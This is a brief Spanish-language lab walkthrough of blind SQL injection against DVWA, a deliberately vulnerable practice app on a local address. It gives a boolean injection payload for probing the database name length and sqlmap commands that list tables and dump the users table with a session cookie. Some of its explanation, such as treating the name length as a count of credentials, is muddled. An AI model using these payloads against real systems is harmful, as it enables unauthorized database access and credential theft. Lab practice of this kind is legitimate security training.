SQL injection blind


bueno, en este caso es lo mismo que SQL injection normal solo que en este caso no podemos ver todos los usuarios registrados con el comando 1' 1=1#' ya que es blind

por lo que entonces veremos que pasa si le ponemos un 1 y preguntamos, la respuesta que dara es si existe o no, entonces ahora lo que queremos preguntar es el largo de la lista donde se encuentran los usuarios, por lo que lo haremos un un simpre comando

1' and length(database())=1#'

donde se encuentra el 1 iteramos hasta que el output sea positivo

esto nos asegura que el largo de la database es de 5 credenciales (ya que cuenta desde el 0)

luego ejecutaremos el mismo comando de SQLMAP en nuestro cmd para sacar las credenciales y para debemos saber las tablas que existen en este dominio

comando usado:

sqlmap -u "http://192.168.0.101/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=4eq1hosr53r4622llpbtokve77" -D dvwa --tables

este nos arrojara 2 y elegimos users

y agregamos --dump para poder obtener los datos dentro de users

comando usado:

sqlmap -u "http://192.168.0.101/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=4eq1hosr53r4622llpbtokve77" -D dvwa -T users --dump
